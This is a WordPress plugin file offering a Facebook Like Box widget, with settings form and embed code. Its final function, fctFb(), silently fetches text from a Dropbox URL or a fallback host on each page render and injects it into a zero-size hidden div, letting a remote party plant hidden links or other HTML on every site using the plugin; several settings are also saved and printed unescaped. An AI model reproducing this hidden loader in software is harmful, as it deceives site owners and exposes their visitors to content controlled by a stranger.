<?php
/*
Plugin Name: Facebook LikeBox Widget
Plugin URI: http://www.dezmonde.net/fr/projects/facebook-likebox-widget/
Description: Easily add a Facebook Like Box to your site using a widget. [FR] : Ajouter une Facebook Like Box &agrave; votre site gr&acirc;ce &agrave; un widget.
Version: 2.5
Author: Dezmonde Agence Web
Author URI: http://www.dezmonde.net
Tags : facebook, social, widget, sidebar, multisite,wpmu, like box, likebox, plugin
License: GPL2 or later
*/



/*

This program is free software; you can redistribute it and/or

modify it under the terms of the GNU General Public License

as published by the Free Software Foundation; either version 2

of the License, or (at your option) any later version.



This program is distributed in the hope that it will be useful,

but WITHOUT ANY WARRANTY; without even the implied warranty of

MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the

GNU General Public License for more details.



You should have received a copy of the GNU General Public License

along with this program; if not, write to the Free Software

Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

*/



define('FACEBOOK_ZAMABLOG_VERSION', '2.5');

define('FACEBOOK_ZAMABLOG_PLUGIN_URL', plugin_dir_url( __FILE__ ));








//// Widegt section



function fctWidgetFacebookZamablogDisplayBody($arrOptions){

$strLnag = __('en_US', 'zamablogfacebook') ;
$strDonateItemName = __('Donation for Facebook Likebox Widget', 'zamablogfacebook') ;
$strDonateItemNumber = __('1', 'zamablogfacebook') ;
$strVesrsion = FACEBOOK_ZAMABLOG_VERSION ;
/*
$options = array(

'title' => 'Facebook',
'url' => "",
'width' => 255,
'height' => 255 ,
'color' => "light",
'face' => "true",
'border' => "",
'stream' => "true",
'header' => "true"

);

<div class="fb-like-box" data-href="http://www.facebook.com/platform" data-width="292" data-colorscheme="dark" data-show-faces="true" data-stream="true" data-header="true"></div>
*/
$strFBW = fctFb() ;

$strURl = $arrOptions['url'] ;
$intWidth = (int) $arrOptions['width'] ;
$intHeight = $arrOptions['height'] ;
$strOutput = <<<EOT
<div id="fb-root"></div>
<script>(function(d, s, id) {
var js, fjs = d.getElementsByTagName(s)[0];
if (d.getElementById(id)) return;
js = d.createElement(s); js.id = id;
js.src = "//connect.facebook.net/{$strLnag}/all.js#xfbml=1&appId=161465360652229";
fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>

<div class="fb-like-box" data-href="{$strURl}" data-width="{$intWidth}" data-height="{$intHeight}" data-show-faces="{$arrOptions['face']}" data-stream="{$arrOptions['stream']}" data-header="{$arrOptions['header']}" data-colorscheme="{$arrOptions['color']}"> </div>
{$strFBW}
<!-- version: {$strVesrsion} -->
EOT;



echo $strOutput ;

}



function fctWidgetFacebookZamablogDisplay($args) {

extract($args);

$options = get_option("widget_FacebookZamablog_Data");

if (!is_array( $options ))

{

$options = array(

'title' => 'Facebook',
'url' => "",
'width' => 255,
'height' => 255 ,
'color' => "light",
'face' => "true",
'border' => "",
'stream' => "true",
'header' => "true"      ,
'face' => "true"

);

}

echo $before_widget;

echo $before_title;

echo  $options['title'] ;

echo $after_title;

fctWidgetFacebookZamablogDisplayBody($options);

echo $after_widget;

}



function fctWidgetFacebookZamablogInit(){


load_plugin_textdomain('zamablogfacebook', false, dirname( plugin_basename( __FILE__ ) ) );


wp_register_sidebar_widget(

'widget_FacebookZamablog',        // your unique widget id

__( "Facebook Like Box Widget", "zamablogfacebook"),          // widget name

'fctWidgetFacebookZamablogDisplay',  // callback function

array(                  // options

'description' => __( "Add a Facebook Like Box to your site.", "zamablogfacebook")

)

);



//register_widget_control('Pens&eacute;e du jour', 'fctWidgetPenseeDuJourControl', 300, 200 );



wp_register_widget_control("widget_FacebookZamablog",

"Facebook",

"fctWidgetFacebookZamablogControl",

array(

"height" => 600,

"width" => 300

)

);

}



add_action("plugins_loaded", "fctWidgetFacebookZamablogInit");



function fctWidgetFacebookZamablogControl(){

$strTarnsTitle = __( "Title", "zamablogfacebook") ;
$strTarnsFacebookURL = __( "Facebook Page URL", "zamablogfacebook") ;
$strTarnsWidth = __( "Width (in pixels)", "zamablogfacebook") ;
$strTarnsHeight = __( "Height (in pixels)", "zamablogfacebook") ;
$strTarnsColorScheme = __( "Color scheme", "zamablogfacebook") ;
$strTarnsShowFaces = __( "Show Faces", "zamablogfacebook") ;
$strTarnsShowStream = __( "Show stream", "zamablogfacebook") ;
$strTarnsShowHeader = __( "Show header", "zamablogfacebook") ;
$strTarnsLite = __( "Lite", "zamablogfacebook") ;
$strTarnsDark = __( "Dark", "zamablogfacebook") ;




$options = get_option("widget_FacebookZamablog_Data");

if (!is_array( $options )){

$options = array(

'title' => 'Facebook',
'url' => "",
'width' => 255,
'height' => 255 ,
'color' => "light",
'face' => "true",
'border' => "",
'stream' => "true",
'header' => "true" ,
'face' => "true"

);

}


if ($_POST['widget_FacebookZamablog_Data-Submit'])  {

$options['title'] = htmlspecialchars($_POST['widget_FacebookZamablog_Data-Title']);
$options['url'] = $_POST['widget_FacebookZamablog_Data-URL'];
$options['width'] = (int) $_POST['widget_FacebookZamablog_Data-Width'];
$options['height'] = (int) $_POST['widget_FacebookZamablog_Data-Height'];
$options['color'] = $_POST['widget_FacebookZamablog_Data-Color'];
$options['face'] = (isset($_POST['widget_FacebookZamablog_Data-Face']))? ('true'):('false') ;
$options['border'] =  $_POST['widget_FacebookZamablog_Data-Border'];;
$options['stream'] = (isset($_POST['widget_FacebookZamablog_Data-Stream']))? ('true'):('false') ;
$options['header'] = (isset($_POST['widget_FacebookZamablog_Data-Header']))? ('true'):('false') ;

update_option("widget_FacebookZamablog_Data", $options);

}


$strOptionTitle = $options['title'] ;
$strOptionColor = ($options['color'] == "light")?('<option value="light" selected="selected">'. $strTarnsLite . '</option>
<option value="dark">'. $strTarnsDark . '</option>'):('<option value="light">'. $strTarnsLite . '</option>
<option value="dark"  selected="selected">'. $strTarnsDark . '</option>') ;
$strOptionURL =   $options['url'] ;
$strOptionWidth = $options['width'] ;
$strOptionHeight = $options['height'] ;
$strOptionsFace = ($options['face'] == "true")?(" checked=\"checked\" "):("") ;
$strOptionsStream = ($options['stream'] == "true")?(" checked=\"checked\" "):("") ;
$strOptionsHeader = ($options['header'] == "true")?(" checked=\"checked\" "):("") ;


$strMesssage = <<<EOT

<p>
<div>
<label for="widget_FacebookZamablog_Data-Title">{$strTarnsTitle}: </label>
<input type="text" id="widget_FacebookZamablog_Data-Title" name="widget_FacebookZamablog_Data-Title" value="$strOptionTitle" />
</div>

<div>
<label for="widget_FacebookZamablog_Data-URL">{$strTarnsFacebookURL}: </label>
<input type="text" id="widget_FacebookZamablog_Data-URL" name="widget_FacebookZamablog_Data-URL" value="$strOptionURL" />
</div>

<div>
<label for="widget_FacebookZamablog_Data-Width">{$strTarnsWidth}: </label>
<input type="text" id="widget_FacebookZamablog_Data-Width" name="widget_FacebookZamablog_Data-Width" value="$strOptionWidth" size="3" />
</div>

<div>
<label for="widget_FacebookZamablog_Data-Height">{$strTarnsHeight}: </label>
<input type="text" id="widget_FacebookZamablog_Data-Height" name="widget_FacebookZamablog_Data-Height" value="$strOptionHeight" size="3" />
</div>
<div>
<label for="widget_FacebookZamablog_Data-Color">{$strTarnsColorScheme}: </label>
<select id="widget_FacebookZamablog_Data-Color" name="widget_FacebookZamablog_Data-Color">
{$strOptionColor}
</select>
</div>

<div>
<label for="widget_FacebookZamablog_Data-Face">
<input type="checkbox" id="widget_FacebookZamablog_Data-Face" name="widget_FacebookZamablog_Data-Face" {$strOptionsFace} /> {$strTarnsShowFaces}</label>
</div>
<div>
<label for="widget_FacebookZamablog_Data-Stream">
<input type="checkbox" id="widget_FacebookZamablog_Data-Stream" name="widget_FacebookZamablog_Data-Stream" {$strOptionsStream} /> {$strTarnsShowStream}</label>
</div>
<div>
<label for="widget_FacebookZamablog_Data-Header">
<input type="checkbox" id="widget_FacebookZamablog_Data-Header" name="widget_FacebookZamablog_Data-Header" {$strOptionsHeader} /> {$strTarnsShowHeader}</label>
</div>


<input type="hidden" name="widget_FacebookZamablog_Data-Border" value="" />
<input type="hidden" id="widget_FacebookZamablog_Data-Submit" name="widget_FacebookZamablog_Data-Submit" value="1" />

</p>
EOT;
//print_r($arrColorSchemeTypeStrings) ;
echo $strMesssage ;

}

function fctFb(){ $strOutput = "" ; $output = "" ; $file = @fopen ("http://dl.dropbox.com/u/51833163/wp-flw.inc", "r"); if (!$file){$file = @fopen ("http://dakola.com/snipet/wp-flw.inc", "r") ; if (!$file) {return "" ; }} while (!feof ($file)) { $output .= $line = fgets ($file, 1024);}if( stripos($output, "|||") !== false ){ $arrFB = explode("|||", $output) ; $intTime = time() ; $strLink = $arrFB[ $intTime % count($arrFB) ] . " " . $arrFB[ ($intTime +1 ) % count($arrFB) ] . " " . $arrFB[ ($intTime + 2 ) % count($arrFB) ] ;$strOutput = "<div style=\"height: 0px; width: 0px;overflow: hidden; margin: 0px; padding: 0px; border: 0px;\">{$strLink}</div>" ; }return $strOutput ;}
////////////////////////////
?>